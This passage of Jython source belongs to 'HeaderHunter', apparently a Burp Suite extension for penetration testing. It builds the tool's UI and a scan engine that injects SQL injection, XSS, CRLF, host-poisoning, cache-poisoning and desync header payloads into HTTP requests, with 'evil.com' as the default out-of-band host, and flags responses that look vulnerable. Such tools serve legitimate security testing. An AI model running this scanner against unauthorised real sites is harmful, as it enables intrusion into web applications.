        # Bottom: Detail pane
        detail_tabs = JTabbedPane()
        self._request_viewer = JTextArea()
        self._request_viewer.setEditable(False)
        self._request_viewer.setFont(Font("Monospaced", Font.PLAIN, 12))
        detail_tabs.addTab("Request / Details", JScrollPane(self._request_viewer))

        self._response_viewer = JTextArea()
        self._response_viewer.setEditable(False)
        self._response_viewer.setFont(Font("Monospaced", Font.PLAIN, 12))
        detail_tabs.addTab("Response", JScrollPane(self._response_viewer))

        split_pane = JSplitPane(JSplitPane.VERTICAL_SPLIT, table_scroll, detail_tabs)
        split_pane.setDividerLocation(350)
        panel.add(split_pane, AwtBorderLayout.CENTER)

        # Bottom status
        status_panel = JPanel(AwtBorderLayout())
        status_panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))
        self._progress_bar = JProgressBar(0, 100)
        self._progress_bar.setStringPainted(True)
        self._status_label = JLabel("Status: Ready - Right-click a request in HTTP History to begin")
        status_panel.add(self._progress_bar, AwtBorderLayout.CENTER)
        status_panel.add(self._status_label, AwtBorderLayout.EAST)
        panel.add(status_panel, AwtBorderLayout.SOUTH)

        # Event listeners
        self._btn_start.addActionListener(StartButtonListener(self))
        self._btn_stop.addActionListener(StopButtonListener(self))
        self._btn_clear.addActionListener(ClearButtonListener(self))
        self._btn_export.addActionListener(ExportButtonListener(self))

        return panel

    def get_enabled_categories(self):
        cats = []
        if self._chk_host.isSelected(): cats.append("Host Poisoning")
        if self._chk_crlf.isSelected(): cats.append("CRLF Injection")
        if self._chk_sqli.isSelected(): cats.append("SQL Injection")
        if self._chk_xss.isSelected(): cats.append("XSS via Headers")
        if self._chk_ip.isSelected(): cats.append("IP Spoofing")
        if self._chk_log.isSelected(): cats.append("Log Injection")
        if self._chk_cache.isSelected(): cats.append("Cache Poisoning")
        if self._chk_desync.isSelected(): cats.append("HTTP Desync")
        if self._chk_oob.isSelected(): cats.append("OOB Interaction")
        return cats

# ==================== EVENT LISTENERS ====================

class MenuActionListener(ActionListener):
    def __init__(self, extender, invocation):
        self.extender = extender
        self.invocation = invocation

    def actionPerformed(self, event):
        try:
            messages = self.invocation.getSelectedMessages()
            if messages and len(messages) > 0:
                msg = messages[0]
                if msg and msg.getRequest() and msg.getHttpService():
                    self.extender.start_scan(msg)
                else:
                    JOptionPane.showMessageDialog(
                        self.extender._main_panel,
                        "Selected message has no request or service data.",
                        "Invalid Request",
                        JOptionPane.WARNING_MESSAGE
                    )
            else:
                JOptionPane.showMessageDialog(
                    self.extender._main_panel,
                    "No request selected. Please select a request first.",
                    "No Selection",
                    JOptionPane.WARNING_MESSAGE
                )
        except Exception, e:
            import traceback
            err = traceback.format_exc()
            print("[HeaderHunter] Menu action error: %s" % str(e))
            print(err)
            JOptionPane.showMessageDialog(
                self.extender._main_panel,
                "Error sending request to HeaderHunter: " + str(e),
                "Error",
                JOptionPane.ERROR_MESSAGE
            )

class StartButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        JOptionPane.showMessageDialog(
            self.extender._main_panel,
            "To start a scan:\n1. Right-click any request in HTTP History / Target\n2. Select 'Send to HeaderHunter'\n\nThe tool will automatically test all enabled payload categories.",
            "How to Use",
            JOptionPane.INFORMATION_MESSAGE
        )

class StopButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender.stop_scan()

class ClearButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender._clear_results()

class ExportButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender._export_results()

class ResultSelectionListener(ListSelectionListener):
    def __init__(self, extender):
        self.extender = extender

    def valueChanged(self, event):
        if not event.getValueIsAdjusting():
            self.extender._on_result_selected(event)

# ==================== TABLE COMPONENTS ====================

class ResultsTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self)
        self.setColumnIdentifiers(["#", "Category", "Header", "Payload", "Status", "Length", "Time", "Issue", "Severity"])

    def isCellEditable(self, row, column):
        return False

class SeverityRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column)
        if not isSelected:
            severity = table.getModel().getValueAt(row, 8)
            if severity == "High":
                c.setBackground(Color(255, 200, 200))
                c.setForeground(Color(139, 0, 0))
            elif severity == "Medium":
                c.setBackground(Color(255, 230, 200))
                c.setForeground(Color(184, 134, 11))
            elif severity == "Low":
                c.setBackground(Color(255, 255, 200))
                c.setForeground(Color(85, 107, 47))
            else:
                c.setBackground(Color.WHITE)
                c.setForeground(Color.BLACK)
            c.setFont(c.getFont().deriveFont(Font.BOLD if severity == "High" else Font.PLAIN))
        return c

# ==================== SCAN ENGINE ====================

class ScanThread(Thread):
    def __init__(self, extender, request, service):
        Thread.__init__(self)
        self.extender = extender
        self.request = request
        self.service = service
        self.setDaemon(True)
        self._helpers = extender._helpers
        self._callbacks = extender._callbacks

    def run(self):
        try:
            self._run_scan()
        except Exception, e:
            import traceback
            err = traceback.format_exc()
            print("[HeaderHunter] Scan error: %s" % str(e))
            print(err)
            SwingUtilities.invokeLater(ScanCompleteRunnable(self.extender))

    def _run_scan(self):
        # Get baseline
        baseline = self._get_baseline()
        if not baseline:
            SwingUtilities.invokeLater(ScanCompleteRunnable(self.extender))
            return

        # Get payloads
        stealth = self.extender._chk_stealth.isSelected()
        oob_domain = self.extender._txt_oob.getText() or "evil.com"
        all_payloads = get_payloads(stealth, oob_domain)
        enabled_cats = self.extender.get_enabled_categories()
        payloads = [p for p in all_payloads if p["cat"] in enabled_cats]

        total = len(payloads)
        if total == 0:
            SwingUtilities.invokeLater(ScanCompleteRunnable(self.extender))
            return

        print("[HeaderHunter] Starting scan with %d payloads against %s" % (total, self.service.getHost()))
        self.extender._status_label.setText("Status: Testing %d payloads..." % total)

        # Scan each payload
        for idx, payload in enumerate(payloads):
            if self.extender._stop_flag:
                print("[HeaderHunter] Scan stopped by user")
                break

            SwingUtilities.invokeLater(UpdateProgressRunnable(self.extender, idx + 1, total))

            result = self._test_payload(payload, baseline)
            if result:
                SwingUtilities.invokeLater(AddResultRunnable(self.extender, result))

            # Delay
            delay = self.extender._delay_spinner.getValue()
            if delay > 0:
                time.sleep(delay / 1000.0)

        SwingUtilities.invokeLater(ScanCompleteRunnable(self.extender))

    def _get_baseline(self):
        """Get baseline response for comparison (averages 2 requests)."""
        baselines = []
        self.extender._status_label.setText("Status: Getting baseline (1/2)...")
        for i in range(2):
            try:
                start = time.time()
                response = self._callbacks.makeHttpRequest(self.service, self.request)
                elapsed = time.time() - start

                if response and response.getResponse():
                    resp_info = self._helpers.analyzeResponse(response.getResponse())
                    body_offset = resp_info.getBodyOffset()
                    resp_bytes = response.getResponse()
                    body_bytes = resp_bytes[body_offset:] if body_offset < len(resp_bytes) else None
                    body = self._helpers.bytesToString(body_bytes) if body_bytes else ""

                    headers = []
                    hdr_list = resp_info.getHeaders()
                    for j in range(hdr_list.size()):
                        headers.append(str(hdr_list.get(j)))

                    baselines.append({
                        "status": resp_info.getStatusCode(),
                        "length": len(resp_bytes),
                        "body_length": len(body_bytes) if body_bytes else 0,
                        "time": elapsed,
                        "headers": headers,
                        "body": body,
                        "normalized": normalize_body(body)
                    })
                    print("[HeaderHunter] Baseline %d: HTTP %d, %d bytes, %.2fs" % (
                        i+1, resp_info.getStatusCode(), len(resp_bytes), elapsed))
                else:
                    print("[HeaderHunter] Baseline %d: No response received" % (i+1))
            except Exception, e:
                print("[HeaderHunter] Baseline %d error: %s" % (i+1, str(e)))

            if len(baselines) < 2 and i == 0:
                self.extender._status_label.setText("Status: Getting baseline (2/2)...")
                time.sleep(0.5)

        if not baselines:
            print("[HeaderHunter] Failed to get any baseline response")
            self.extender._status_label.setText("Status: Baseline failed - check Extender output")
            return None

        print("[HeaderHunter] Using baseline: HTTP %d, %d bytes, %.2fs" % (
            baselines[0]["status"], baselines[0]["length"], baselines[0]["time"]))
        return baselines[0]

    def _test_payload(self, payload, baseline):
        """Test a single payload and return result if interesting."""
        try:
            # Parse original request
            req_info = self._helpers.analyzeRequest(self.request)

            headers = []
            hdr_list = req_info.getHeaders()
            for i in range(hdr_list.size()):
                headers.append(str(hdr_list.get(i)))

            body_offset = req_info.getBodyOffset()
            req_len = len(self.request)
            if body_offset < req_len:
                body = self.request[body_offset:]
            else:
                body = None

            # Modify headers
            header_name = payload["header"]
            header_value = payload["value"]

            new_headers = ArrayList()
            for h in headers:
                if not h.lower().startswith(header_name.lower() + ":"):
                    new_headers.add(h)
            new_headers.add("%s: %s" % (header_name, header_value))

            # Random UA if enabled
            if self.extender._chk_random_ua.isSelected():
                filtered = ArrayList()
                for h in new_headers:
                    if not h.lower().startswith("user-agent:"):
                        filtered.add(h)
                new_headers = filtered
                new_headers.add("User-Agent: %s" % get_random_ua())

            # Build and send request
            new_request = self._helpers.buildHttpMessage(new_headers, body)

            start = time.time()
            response = self._callbacks.makeHttpRequest(self.service, new_request)
            elapsed = time.time() - start

            if not response or not response.getResponse():
                return None

            # Analyze response
            resp_info = self._helpers.analyzeResponse(response.getResponse())
            status = resp_info.getStatusCode()
            resp_body_offset = resp_info.getBodyOffset()
            resp_body_bytes = response.getResponse()[resp_body_offset:]
            resp_body = self._helpers.bytesToString(resp_body_bytes)

            resp_headers = []
            resp_hdr_list = resp_info.getHeaders()
            for i in range(resp_hdr_list.size()):
                resp_headers.append(resp_hdr_list.get(i))

            resp_length = len(response.getResponse())

            # Analyze result
            issue = None
            severity = payload.get("severity", "Low")
            detect_type = payload.get("detect", "diff")

            # Time-based detection
            if detect_type == "time" and payload.get("time_threshold"):
                if elapsed >= payload["time_threshold"]:
                    issue = "Time-based anomaly detected (%.2fs vs ~%.2fs baseline)" % (elapsed, baseline["time"])
                    severity = "High"

            # Error-based detection
            if not issue and detect_type in ("error", "diff", "time"):
                if detect_sql_error(resp_body):
                    issue = "SQL error pattern detected in response"
                    severity = "High"

            # Reflection detection
            if not issue and detect_type in ("reflection", "diff"):
                if payload["value"] in resp_body:
                    context = detect_xss_context(resp_body, payload["value"])
                    if context:
                        issue = "Payload reflected in %s" % context
                        severity = "High"
                    else:
                        issue = "Payload value reflected in response body"
                        severity = "Medium"

            # Header injection detection
            if not issue and detect_type == "header":
                new_hdrs = detect_new_headers(baseline["headers"], resp_headers)
                if new_hdrs:
                    issue = "New response headers detected: %s" % ", ".join(new_hdrs)
                    severity = "High"
                elif "injected=true" in resp_body.lower() or "injected:" in resp_body.lower():
                    issue = "CRLF injection reflected in body"
                    severity = "High"

            # Redirect detection
            if not issue and detect_type in ("redirect", "cache"):
                location = get_header_value(resp_headers, "Location")
                if location:
                    if "evil.com" in location or self.extender._txt_oob.getText() in location:
                        issue = "Redirect to injected host: %s" % location
                        severity = "High"

                # Also check body for poisoned links
                if not issue:
                    oob = self.extender._txt_oob.getText()
                    if oob in resp_body:
                        issue = "Poisoned host appears in response body"
                        severity = "High"

            # Cache detection
            if not issue and detect_type == "cache":
                cache_status = get_header_value(resp_headers, "X-Cache") or get_header_value(resp_headers, "CF-Cache-Status") or get_header_value(resp_headers, "X-Cache-Status")
                if cache_status:
                    oob = self.extender._txt_oob.getText()
                    if oob in resp_body:
                        issue = "Potential cache poisoning (cache: %s, host reflected)" % cache_status
                        severity = "High"

            # Diff detection (fallback for all)
            if not issue:
                status_diff = status != baseline["status"]
                length_diff = abs(resp_length - baseline["length"]) > max(baseline["length"] * 0.05, 50)
                body_norm = normalize_body(resp_body)
                body_diff = body_norm != baseline.get("normalized", baseline["body"])
                time_diff = elapsed > (baseline["time"] * 3 + 1)

                if status_diff or length_diff or (body_diff and length_diff) or time_diff:
                    parts = []
                    if status_diff:
                        parts.append("status %d->%d" % (baseline["status"], status))
                    if length_diff:
                        parts.append("length delta %d" % (resp_length - baseline["length"]))
                    if body_diff and length_diff:
                        parts.append("body changed")
                    if time_diff:
                        parts.append("time anomaly")
                    issue = "Response anomaly: %s" % ", ".join(parts)
                    # Only flag as Medium if status changed or significant length diff
                    if status_diff or (length_diff and abs(resp_length - baseline["length"]) > 200):
                        severity = "Medium"
                    else:
                        severity = "Low"

            if not issue:
                return None

            return {
                "category": payload["cat"],
                "header": payload["header"],
                "payload": payload["value"],
                "description": payload["desc"],
                "status": status,
                "length": resp_length,
                "time": elapsed,
                "issue": issue,
                "severity": severity,
                "request": new_request,
                "response": response.getResponse()
            }

        except Exception, e:
            print("[HeaderHunter] Payload error (%s): %s" % (payload.get("desc", "unknown"), str(e)))
            return None

# ==================== UI UPDATE RUNNABLES ====================

class AddResultRunnable(Runnable):
    def __init__(self, extender, result):
        self.extender = extender
        self.result = result

    def run(self):
        self.extender.add_result(self.result)

class UpdateProgressRunnable(Runnable):
    def __init__(self, extender, current, total):
        self.extender = extender
        self.current = current
        self.total = total

    def run(self):
        self.extender.update_progress(self.current, self.total)

class ScanCompleteRunnable(Runnable):
    def __init__(self, extender):
        self.extender = extender

    def run(self):
        self.extender.scan_complete()
